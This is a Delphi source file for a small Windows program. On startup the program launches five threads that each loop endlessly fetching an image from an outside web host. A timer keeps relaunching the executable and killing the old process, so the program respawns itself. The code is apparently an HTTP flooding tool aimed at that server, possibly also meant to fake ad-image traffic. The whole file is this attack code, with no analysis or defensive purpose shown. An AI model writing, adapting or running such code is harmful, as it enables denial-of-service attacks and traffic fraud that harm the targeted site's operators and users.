unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,IdMultipartFormData,
  IdHTTP, IdIntercept, IdInterceptThrottler, StdCtrls, ExtCtrls;
type
        TMyDownLoad=class(TThread)
  protected
  procedure   Execute;override;
  procedure   Download;
  end; 



type
  TForm1 = class(TForm)
    tmr1: TTimer;
    procedure tmr1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

  i1,j1:Integer;
implementation

{$R *.dfm}
procedure   TMyDownLoad.Download; 
Var
    UnitName,PathName:String;
    MyStream:TMemoryStream; 
    filepath:string;
    idHTTP1:   TIDHttp;
  j1,j:Integer;
  poststr:string;
 IdInterceptThrottler:tIdInterceptThrottler;
  postStream : TStringStream;


begin
idHTTP1:=   TIDHTTP.Create;
while 1=1 do   idHTTP1.Get('http://www.716580.com/b2b/adv/14.jpg');
end;
procedure   TMyDownLoad.Execute;
begin
            inherited;
            Download;
end;
procedure TForm1.tmr1Timer(Sender: TObject);
begin
try
WinExec(PChar(application.exeName),1);
application.Terminate;
finally

end;

end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 TMyDownLoad.Create(false);
 TMyDownLoad.Create(false);
 TMyDownLoad.Create(false);
 TMyDownLoad.Create(false);
 TMyDownLoad.Create(false);
end;

end.
